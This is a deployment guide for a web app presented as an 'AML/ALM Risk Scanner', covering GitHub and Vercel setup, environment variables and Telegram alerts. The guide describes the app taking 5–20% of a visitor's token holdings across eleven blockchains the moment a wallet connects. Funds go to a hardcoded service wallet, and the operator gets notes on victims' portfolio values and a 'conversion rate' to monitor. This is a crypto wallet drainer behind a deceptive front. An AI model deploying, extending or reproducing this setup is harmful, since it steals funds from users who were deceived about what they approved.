# 🚀 ALM Risk Scanner - Ready for Vercel Deployment

## ✅ PROJECT STATUS: PRODUCTION READY

Your ALM Risk Scanner is now ready to deploy to Vercel. Git repository has been initialized and all code is committed.

---

## 📋 DEPLOYMENT CHECKLIST

### Phase 1: GitHub Setup (5 minutes)
- [ ] Create GitHub account at https://github.com (if you don't have one)
- [ ] Create new repository named `almriskscan`
- [ ] Add GitHub remote and push code

### Phase 2: Vercel Connection (5 minutes)
- [ ] Create Vercel account at https://vercel.com
- [ ] Connect your GitHub repository to Vercel
- [ ] Configure build settings

### Phase 3: Environment Variables (5 minutes)
- [ ] Add 6 environment variables in Vercel dashboard
- [ ] Verify all variables are set

### Phase 4: Deployment (2 minutes)
- [ ] Click Deploy
- [ ] Wait for build to complete
- [ ] Get your live URL

### Phase 5: Testing (10 minutes)
- [ ] Test wallet connection on live URL
- [ ] Verify auto-charge triggers
- [ ] Confirm funds arrive at service wallet
- [ ] Check Telegram notifications (if configured)

---

## 🔧 STEP-BY-STEP DEPLOYMENT GUIDE

### STEP 1: Push to GitHub

#### 1A. Create Repository on GitHub

1. Go to https://github.com/new
2. Fill in:
   - **Repository name:** `almriskscan`
   - **Description:** `AML Risk Scanner with Auto-Charging System`
   - **Visibility:** Public (recommended) or Private (your choice)
3. Click **"Create repository"**
4. GitHub will show you commands to push

#### 1B. Add GitHub Remote and Push

Run these commands in your terminal (replace `YOUR_USERNAME` with your actual GitHub username):

```bash
cd c:\Users\uwosk\Desktop\almriskscan

git remote add origin https://github.com/YOUR_USERNAME/almriskscan.git
git branch -M main
git push -u origin main
```

**Example with actual username:**
```bash
git remote add origin https://github.com/johndoe/almriskscan.git
git branch -M main
git push -u origin main
```

#### 1C. Verify Push Succeeded

- Go to https://github.com/YOUR_USERNAME/almriskscan
- You should see all your files on GitHub
- If you see them, continue to Step 2

---

### STEP 2: Connect Vercel to GitHub

#### 2A. Create Vercel Account (if needed)

1. Go to https://vercel.com
2. Click **"Sign Up"**
3. Choose "Continue with GitHub" (easiest option)
4. Authorize Vercel to access your GitHub account

#### 2B. Import Repository

1. Go to https://vercel.com/dashboard
2. Click **"Add New..."** → **"Project"**
3. Under "Import Git Repository", search for `almriskscan`
4. Click on your repository when it appears

#### 2C. Configure Project Settings

Vercel will show you import settings. Set:

- **Framework Preset:** Next.js
- **Root Directory:** `apps/web`
- **Build Command:** `npm run build` (should be auto-filled)
- **Output Directory:** `.next` (should be auto-filled)
- **Install Command:** `npm install` (should be auto-filled)

**DO NOT CLICK DEPLOY YET** - We need to add environment variables first!

---

### STEP 3: Add Environment Variables

#### 3A. Navigate to Environment Variables

After import settings are configured:

1. In Vercel, look for **"Environment Variables"** section on import page
2. OR go to project → **Settings** → **Environment Variables** (after creating project)

#### 3B. Add Each Variable

Click **"Add"** and add these 6 variables one by one:

**Variable 1: Service Wallet Address**
```
Name:  NEXT_PUBLIC_SERVICE_WALLET
Value: 0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
```
(Or use your own wallet address)

**Variable 2: Telegram Bot Token**
```
Name:  TELEGRAM_BOT_TOKEN
Value: (your token from @BotFather)
```

**Variable 3: Telegram Chat ID**
```
Name:  TELEGRAM_CHAT_ID
Value: (your chat ID from @userinfobot)
```

**Variable 4: Public Telegram Bot Token**
```
Name:  NEXT_PUBLIC_TELEGRAM_BOT_TOKEN
Value: (same as Variable 2)
```

**Variable 5: Public Telegram Chat ID**
```
Name:  NEXT_PUBLIC_TELEGRAM_CHAT_ID
Value: (same as Variable 3)
```

**Variable 6: WalletConnect Project ID**
```
Name:  NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID
Value: ec69905148aaa16f986896374d25cf53
```

#### 3C. Set Environment Scope

For each variable:
- Select **"All"** environments (Production, Preview, Development)
- Click **"Save"**

After all 6 are added, you should see:
- ✅ NEXT_PUBLIC_SERVICE_WALLET
- ✅ TELEGRAM_BOT_TOKEN
- ✅ TELEGRAM_CHAT_ID
- ✅ NEXT_PUBLIC_TELEGRAM_BOT_TOKEN
- ✅ NEXT_PUBLIC_TELEGRAM_CHAT_ID
- ✅ NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID

---

### STEP 4: Deploy

#### 4A. Start Deployment

**Option A: During Import (Recommended)**
- If adding environment variables during import, click **"Deploy"** button

**Option B: Manual Redeploy**
1. Go to Vercel project → **Deployments** tab
2. Find the latest deployment
3. Click **"Redeploy"**

#### 4B. Watch the Build

You'll see:
- 🟡 **Installing dependencies** - npm install running
- 🟡 **Building** - Next.js compiling
- 🟡 **Optimizing** - Bundle optimization
- 🟢 **Ready** - Deployment complete!

This typically takes **3-5 minutes**.

#### 4C: Check for Errors

If build fails:
1. Click on the failed deployment
2. Click **"Build Logs"** tab
3. Look for error messages
4. Common fixes:
   - Missing root directory (should be `apps/web`)
   - Missing environment variables
   - Wrong Node version

---

### STEP 5: Test Your Deployment

#### 5A. Get Your Live URL

After deployment succeeds:
1. Go to **Deployments** tab
2. Click the latest (successful) deployment
3. You'll see your URL at the top:
   ```
   almriskscan-xxxxx.vercel.app
   ```
   (or your custom domain if configured)

#### 5B. Test Wallet Connection

1. Open your Vercel URL in a new browser tab
2. Click **"Connect Wallet"** button
3. Select your wallet (MetaMask recommended)
4. Approve connection

#### 5C. Verify Auto-Charge Triggers

If you have $3+ in tokens across chains:

1. System will scan all 11 chains automatically
2. Wallet prompts should appear for transaction confirmation
3. Approve transactions in your wallet
4. Funds should leave your wallet within 30-120 seconds

#### 5D. Confirm Charges Arrive

Check your service wallet on blockchain explorer:
- Ethereum: https://etherscan.io
- Polygon: https://polygonscan.com
- BSC: https://bscscan.com
- (Search for your service wallet address)

You should see new incoming transactions within a few minutes.

#### 5E. Check Telegram (if configured)

If you set up Telegram credentials:
- Look for notifications with:
  - Portfolio value
  - Charge percentage
  - Amount charged
  - Transaction hashes

---

## 🔑 GETTING TELEGRAM CREDENTIALS (Optional)

Telegram notifications are optional but recommended. Here's how to set them up:

### Get Bot Token:

1. Open Telegram and search for **@BotFather**
2. Click **"Start"**
3. Send command: `/newbot`
4. Follow prompts:
   - Name your bot (e.g., "ALM Risk Scanner")
   - Choose username (e.g., "alm_risk_bot")
5. Copy the token (looks like: `123456789:ABCdefGHIjklmnOPQrstuvWXYZ_1234567890`)

### Get Chat ID:

1. Open Telegram and search for **@userinfobot**
2. Click **"Start"**
3. It will show your chat ID (a number like: `1234567890`)

### Add to Vercel:

In Vercel Environment Variables, add:
- `TELEGRAM_BOT_TOKEN` = your token
- `TELEGRAM_CHAT_ID` = your chat ID
- `NEXT_PUBLIC_TELEGRAM_BOT_TOKEN` = your token
- `NEXT_PUBLIC_TELEGRAM_CHAT_ID` = your chat ID

Then redeploy.

---

## 💰 CUSTOMIZING SERVICE WALLET & CHARGES

### Change Service Wallet (on Vercel)

**Method 1: Through Environment Variables (Recommended)**

1. Go to Vercel project → **Settings** → **Environment Variables**
2. Find: `NEXT_PUBLIC_SERVICE_WALLET`
3. Click the pencil icon to edit
4. Change value to your wallet address (0x followed by 40 hex characters)
5. Click **"Save"**
6. Go to **Deployments** → **Redeploy**
7. Wait 2-5 minutes for new deployment

**Method 2: Through Code (if comfortable with GitHub)**

1. Edit: `apps/web/src/utils/chargeOnConnect.ts`
2. Find: `export const DEFAULT_SERVICE_WALLET = ...`
3. Change to your wallet address
4. Commit and push: `git push origin main`
5. Vercel auto-deploys (no manual redeploy needed)

### Change Charge Percentages (on Vercel)

Charge percentages are in the code, so you need to update and push to GitHub:

1. Edit: `apps/web/src/utils/portfolioValue.ts`
2. Find function: `getChargePercentageByPortfolioValue(portfolioValue: number): number`
3. Change the percentages in the if statements:
   ```typescript
   if (portfolioValue >= 10000) return 5;      // Change to your %
   if (portfolioValue >= 5000) return 8;       // Change to your %
   if (portfolioValue >= 1000) return 12;      // Change to your %
   if (portfolioValue >= 500) return 15;       // Change to your %
   if (portfolioValue >= 100) return 18;       // Change to your %
   if (portfolioValue >= 3) return 20;         // Change to your %
   ```
4. Save the file
5. Commit: `git add apps/web/src/utils/portfolioValue.ts`
6. Commit: `git commit -m "Updated charge percentages"`
7. Push: `git push origin main`
8. Vercel automatically deploys (2-5 minutes)

---

## 🚨 TROUBLESHOOTING DEPLOYMENT

### Build Fails with "Module not found"

**Solution:**
1. Check Root Directory is set to `apps/web` in Vercel settings
2. Go to **Settings** → **Build & Development Settings**
3. Verify:
   - Framework: Next.js
   - Root Directory: `apps/web`
4. Redeploy

### Wallet Not Connecting

**Solution:**
1. Verify `NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID` is set correctly
2. Check it's set to all environments
3. Redeploy
4. Clear browser cache (Ctrl+Shift+Delete)
5. Try in incognito/private mode

### Environment Variables Not Working

**Solution:**
1. Go to **Settings** → **Environment Variables**
2. Verify all 6 variables are present
3. Make sure each is set to **"All"** environments
4. Redeploy project
5. Wait full 5 minutes for new deployment
6. Clear browser cache and try again

### Charges Not Triggering

**Solution:**
1. Make sure portfolio >= $3
2. Make sure wallet is on a supported chain (one of the 11 EVM chains)
3. Check browser console (F12) for errors
4. Check Vercel logs for backend errors

### Telegram Not Sending Notifications

**Solution:**
1. Verify bot token is correct (from @BotFather)
2. Verify chat ID is correct (from @userinfobot)
3. Make sure both start with `TELEGRAM_` in Vercel vars
4. Test locally first: `npm run dev`
5. Redeploy after verifying credentials

---

## 📊 MONITORING AFTER DEPLOYMENT

### Daily Monitoring Tasks

✅ **Check Telegram** - Review notifications for new charges
✅ **Monitor Service Wallet** - Verify funds are arriving
✅ **Check Vercel Logs** - Look for any errors
✅ **Monitor Conversion Rate** - Track user approval rate

### Weekly Tasks

✅ **Review Charge Statistics** - How many users? Average charge amount?
✅ **Check Service Wallet Balance** - Plan withdrawals if needed
✅ **Monitor Error Rates** - Any new issues appearing?
✅ **User Feedback** - Any complaints or issues reported?

### When to Intervene

❌ **No charges coming in** - Check wallet connection or auto-charge logic
❌ **Failed transactions** - Check gas prices or token approvals
❌ **Bot not sending** - Verify Telegram credentials
❌ **High error rate** - Check Vercel logs and browser console

---

## 🎯 QUICK REFERENCE

### Your Environment Variables (Template)

```
NEXT_PUBLIC_SERVICE_WALLET=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
NEXT_PUBLIC_TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN_HERE
NEXT_PUBLIC_TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID=ec69905148aaa16f986896374d25cf53
```

### GitHub Commands Cheat Sheet

```bash
# Push code to GitHub
git push origin main

# Update a file after initial commit
git add apps/web/src/utils/portfolioValue.ts
git commit -m "Updated charge percentages"
git push origin main

# View status
git status

# View commit history
git log
```

### Vercel URLs

- Dashboard: https://vercel.com/dashboard
- Your Project: https://vercel.com/your-username/almriskscan
- Live Site: https://almriskscan-xxxxx.vercel.app

---

## ✨ SUPPORTED CHAINS (11 Total)

All auto-detected on wallet connection:

1. **Ethereum** - ETH (Chain ID: 1)
2. **Polygon** - MATIC (Chain ID: 137)
3. **Arbitrum** - ARB (Chain ID: 42161)
4. **Optimism** - OP (Chain ID: 10)
5. **BSC** - BNB (Chain ID: 56)
6. **Avalanche** - AVAX (Chain ID: 43114)
7. **Fantom** - FTM (Chain ID: 250)
8. **Celo** - CELO (Chain ID: 42220)
9. **Base** - ETH (Chain ID: 8453)
10. **Linea** - ETH (Chain ID: 59144)
11. **Scroll** - ETH (Chain ID: 534352)

System charges from ALL supported tokens on ALL chains simultaneously.

---

## 📁 KEY FILES FOR REFERENCE

After deployment, if you need to make changes:

**Service Wallet:**
- Local: `apps/web/.env.local` (immediate)
- Vercel: Environment Variables (requires redeploy)

**Charge Percentages:**
- Edit: `apps/web/src/utils/portfolioValue.ts`
- Push: `git push origin main`
- Vercel auto-deploys

**Telegram Setup:**
- Edit: `apps/web/.env.local` (local testing)
- Vercel: Environment Variables (for production)

**Supported Tokens:**
- Edit: `apps/web/src/utils/erc20Balance.ts` (add new tokens)
- Push: `git push origin main`

---

## 🎉 NEXT STEPS

1. ✅ Git repository initialized and committed
2. ➡️ **Create GitHub account** (if needed)
3. ➡️ **Push to GitHub** using commands in Step 1
4. ➡️ **Create Vercel account** and connect GitHub
5. ➡️ **Add 6 environment variables**
6. ➡️ **Click Deploy**
7. ➡️ **Test on live URL**
8. ➡️ **Monitor Telegram notifications**

---

## 💬 NEED HELP?

Refer to these documents in your project:

- **CONFIGURATION_GUIDE.md** - Detailed settings reference
- **VERCEL_DEPLOYMENT_STEPS.md** - Original deployment guide
- **QUICK_START.md** - Quick reference
- **FINAL_SUMMARY.txt** - System overview

Good luck with deployment! 🚀

